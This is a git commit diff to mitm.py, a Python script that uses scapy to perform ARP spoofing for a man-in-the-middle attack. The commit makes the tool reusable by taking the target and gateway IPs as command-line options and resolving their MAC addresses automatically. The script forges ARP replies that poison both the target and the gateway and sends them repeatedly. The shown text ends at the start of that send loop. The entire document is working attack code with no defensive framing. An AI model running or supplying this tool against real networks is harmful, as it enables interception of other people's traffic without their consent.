60cc27999702ca378c0222fb4a08ad48bc22af02
adkevin3307 <adkevin3307@gmail.com>
2018-12-13 15:10:50 +0800

    3

--- mitm.py
+++ mitm.py
@@ -1,24 +1,34 @@
 import time
+import argparse
 from scapy.all import ARP, Ether, sendp
+from scapy.layers.l2 import getmacbyip
 
-def arp(src_mac, gateway_ip, tgt_mac, tgt_ip):
-    eth = Ether(src = src_mac, dst = tgt_mac)
-    arp = ARP(hwsrc = src_mac, psrc = gateway_ip, hwdst = tgt_mac, pdst = tgt_ip, op = "is-at")
+def arp(gateway_ip, tgt_mac, tgt_ip):
+    eth = Ether()
+    arp = ARP(psrc = gateway_ip, hwdst = tgt_mac, pdst = tgt_ip, op = "is-at")
     pkt = eth / arp
     return pkt
 
 if __name__ == '__main__':
-    tgt_ip = '192.168.4.153'
-    tgt_mac = '40:4e:36:e0:38:b6'
-    gateway_ip = '192.168.1.1'
-    gateway_mac = '70:4c:a5:66:e4:66'
-    # src_mac = 'd0:17:c2:09:a9:25'
-    src_mac = '10:02:b5:c9:24:67'
+    parser = argparse.ArgumentParser(description = 'man in the middle')
+
+    parser.add_argument('-t', dest = 'targetip', type = str, help = 'target ip')
+    parser.add_argument('-g', dest = 'gatewayip', type = str, help = 'gateway ip')
+
+    args = parser.parse_args()
+
+    tgt_ip = args.targetip
+    tgt_mac = getmacbyip(tgt_ip)
+    gateway_ip = args.gatewayip
+    gateway_mac = getmacbyip(gateway_ip)
 
     input('enter')
 
-    pkt_station = arp(src_mac, gateway_ip, tgt_mac, tgt_ip)
-    pkt_gateway = arp(src_mac, tgt_ip, gateway_mac, gateway_ip)
+    pkt_station = arp(gateway_ip, tgt_mac, tgt_ip)
+    pkt_gateway = arp(tgt_ip, gateway_mac, gateway_ip)
+
+    print(pkt_station.show())
+    print(pkt_gateway.show())
 
     while True:
         sendp(pkt_station)
